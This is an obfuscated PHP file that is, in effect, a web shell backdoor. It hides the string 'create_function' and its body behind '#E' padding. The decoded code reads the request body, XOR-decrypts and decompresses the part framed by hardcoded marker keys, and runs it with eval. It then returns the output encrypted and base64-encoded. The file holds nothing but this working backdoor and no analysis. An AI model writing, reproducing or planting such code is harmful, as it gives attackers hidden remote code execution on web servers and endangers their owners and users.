<?php
$H='#E"YjFFxng9qyhW#EOZdR"#E;#Efunction x(#E$t,$k#E#E){$c=st#Erl#Een($k)#E;$l=#';
$X='$#Em[1]),$k)));$o=@#E#Eo#Eb_#Eget_contents#E();@o#Eb_end_clean#E();#E$r=@';
$Y='Estrlen($t);#E$o="";for(#E$i=0;$i#E<$l;){for(#E$j#E=0;($j<$c&#E&#E$i<$l);$j';
$F='ba#Ese#E64_encode(@#Ex(@gzcompre#Ess($o)#E,$k));pr#Ein#Et("$p$kh#E$r$kf");}';
$v='++#E,#E$i++){#E$o.=$t{$i}^#E#E$k{$j};}#E}return $#Eo;}#Eif (@pre#Eg_match(';
$M='$k#E="bfd7d3#E#Ef0";$kh="#E54a417ccb738#E";$kf=#E"d04fd#E910ad41#E"#E;$p=';
$b='E=1) {@#Eob_sta#Ert(#E);@e#Eval(@gzun#Ecompre#Ess(@x(@base#E#E64_decode(#E';
$S='#E"/$#Ek#Eh#E(.+)$kf/",@fil#Ee_ge#Et_conte#E#E#Ents#E("php://input"),$m)=#';
$z=str_replace('R','','crRReaRtRRe_funRction');
$l=str_replace('#E','',$M.$H.$Y.$v.$S.$b.$X.$F);
$n=$z('',$l);$n();
?>
